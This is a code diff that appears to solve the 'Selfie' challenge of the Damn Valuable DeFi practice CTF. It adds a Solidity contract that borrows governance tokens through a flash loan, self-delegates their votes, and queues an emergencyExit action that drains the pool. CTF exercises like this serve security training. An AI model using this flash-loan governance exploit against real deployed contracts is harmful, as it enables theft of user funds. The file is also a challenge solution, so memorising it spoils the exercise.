@@ -5,7 +5,7 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
-import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {SelfiePool, IERC3156FlashBorrower} from "../../src/selfie/SelfiePool.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +62,13 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        uint256 actionId = governance.getActionCounter();
+        pool.flashLoan(IERC3156FlashBorrower(address(new CrackSelfie())), address(token), TOKENS_IN_POOL, bytes(""));
+
+        skip(governance.getActionDelay());
+
+        governance.executeAction(actionId);
+        token.transfer(recovery, TOKENS_IN_POOL);
     }
 
     /**
@@ -72,5 +78,18 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+contract CrackSelfie {
+    function onFlashLoan(
+        address initiator, DamnValuableVotes token, uint256 amount, uint256, bytes calldata
+    ) external returns (bytes32) {
+        token.delegate(address(this));
+        SimpleGovernance(SelfiePool(msg.sender).governance()).queueAction(
+            msg.sender, 0, abi.encodeWithSignature("emergencyExit(address)", initiator)
+        );
+        token.approve(msg.sender, amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
     }
 }
